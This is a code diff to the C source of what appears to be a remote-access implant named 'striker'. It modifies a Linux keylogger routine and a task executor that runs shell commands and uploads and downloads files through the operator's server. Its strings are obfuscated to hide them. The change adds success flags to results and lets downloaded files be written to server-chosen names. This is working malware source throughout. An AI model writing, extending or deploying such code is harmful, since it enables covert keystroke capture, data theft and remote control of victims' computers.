@@ -392,8 +392,8 @@ void keymon(session *striker, task *tsk){
 
   // TODO: Make 'tsk->uid' already initialized with the task ID.
   #ifdef IS_LINUX
-    char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]main-kbd"};
-    for (int i = 0; i < 7; i++)
+    char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful", "[OBFS_ENC]main-kbd"};
+    for (int i = 0; i < 8; i++)
       obfs_decode(strs[i]);
     cJSON *data = tsk->data;
     unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
@@ -465,11 +465,13 @@ void keymon(session *striker, task *tsk){
       cJSON *main_kb_keys = cJSON_CreateArray();
       for (int i = 0; i < count; i++)
         cJSON_AddItemToArray(main_kb_keys, cJSON_CreateNumber(keys[i]));
-      cJSON_AddItemToObject(tsk->result, strs[6], main_kb_keys);
+      cJSON_AddItemToObject(tsk->result, strs[7], main_kb_keys);
+      tsk->successful = 1;
     }else{
       char *res = buffer_to_string(result_buff);
       cJSON_AddItemToObject(tsk->result, strs[5], cJSON_CreateString(res));
     }
+    cJSON_AddItemToObject(tsk->result, strs[6], cJSON_CreateNumber(tsk->successful));
     free(keys);
     free_buffer(result_buff);
   #else
@@ -616,6 +618,7 @@ task *parse_task(cJSON *json){
   t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
   t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
   t->completed = 0;
+  t->successful = 0;
   t->result = cJSON_CreateObject();
   t->input_json = json;
   return t;
@@ -670,6 +673,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
     }
     free(tmp);
     pclose(proc);
+    tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[1])){ // Upload a file to the server.
     char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s"};
     for (int i = 0; i < 3; i++)
@@ -686,6 +690,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
     upload_file(url, filename, rfo, result_buff);
     fclose(rfo);
     free(url);
+    tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[2])){ // Download a file from the server.
     char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s", "[OBFS_ENC]Error writing file: "};
     for (int i = 0; i < 5; i++)
@@ -695,19 +700,16 @@ DWORD WINAPI task_executor(LPVOID ptr)
     char *url = malloc(URL_SIZE);
     if (snprintf(url, URL_SIZE, strs[2], BASE_URL, fileID) < 0)
       abort();
-    char *loc = malloc(PATH_MAX);
-    if (snprintf(loc, PATH_MAX, strs[3], striker->write_dir, name) < 0)
-      abort();
-    FILE *wfo = fopen(loc, "w");
+    FILE *wfo = fopen(name, "w");
     if (wfo != NULL){
       download_file(url, wfo, result_buff);
       fclose(wfo);
+      tsk->successful = 1;
     }else{
       append_buffer(result_buff, strs[4], strlen(strs[4]));
-      append_buffer(result_buff, loc, strlen(loc));
+      append_buffer(result_buff, name, strlen(name));
     }
     free(url);
-    free(loc);
   }else if (!strcmp(tsk->type, cmd_strs[3])){ // Change write directory.
     char strs[][40] = {"[OBFS_ENC]dir", "[OBFS_ENC]Changed write directory!"};
     for (int i = 0; i < 2; i++)
@@ -724,38 +726,49 @@ DWORD WINAPI task_executor(LPVOID ptr)
       striker->write_dir[len + 1] = '\0';
     }
     buffer_strcpy(result_buff, strs[1]);
+    tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
     keymon(striker, tsk);
+    tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[5])){ // Abort the session.
     char msg[] = "[OBFS_ENC]Session aborted!";
     buffer_strcpy(result_buff, obfs_decode(msg));
+    tsk->successful = 1;
     striker->abort = 1;
   }else if (!strcmp(tsk->type, cmd_strs[6])){ // Update callback delay.
     char msg[] = "[OBFS_ENC]Callback delay updated!";
     striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[6]));
     buffer_strcpy(result_buff, obfs_decode(msg));
+    tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[7])){ // Change working directory
-    char strs[][50] = {"[OBFS_ENC]Changed working directory!", "[OBFS_ENC]Error changing working directory!", "[OBFS_ENC]dir"};
-    if (chdir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])))))
-      buffer_strcpy(result_buff, obfs_decode(strs[1]));
-    else
+    char strs[][50] = {"[OBFS_ENC]Error changing working directory!", "[OBFS_ENC]dir"};
+    if (chdir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1]))))){
       buffer_strcpy(result_buff, obfs_decode(strs[0]));
+    }else{
+      char *new_dir = malloc(PATH_MAX);
+      getcwd(new_dir, PATH_MAX);
+      buffer_strcpy(result_buff, new_dir);
+      free(new_dir);
+      tsk->successful = 1;
+    }
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
   }
 
   complete: ; // empty statement to appease GCC
-    char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]result"};
-    for (int i = 0; i < 2; i++)
+    char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful"};
+    for (int i = 0; i < 3; i++)
       obfs_decode(strs[i]);
     #ifdef STRIKER_DEBUG
       printf("[+] Task completed: %s\n", tsk->uid);
     #endif
-    if (!tsk->completed){    
+    // Tasks that prepared their results by themselves will set `completed` to true.
+    if (!tsk->completed){
       char *res = buffer_to_string(result_buff);
       cJSON_AddItemToObject(tsk->result, strs[0], cJSON_CreateString(tsk->uid));
       cJSON_AddItemToObject(tsk->result, strs[1], cJSON_CreateString(res));
+      cJSON_AddItemToObject(tsk->result, strs[2], cJSON_CreateNumber(tsk->successful));
       free(res);
       tsk->completed = 1;
     }
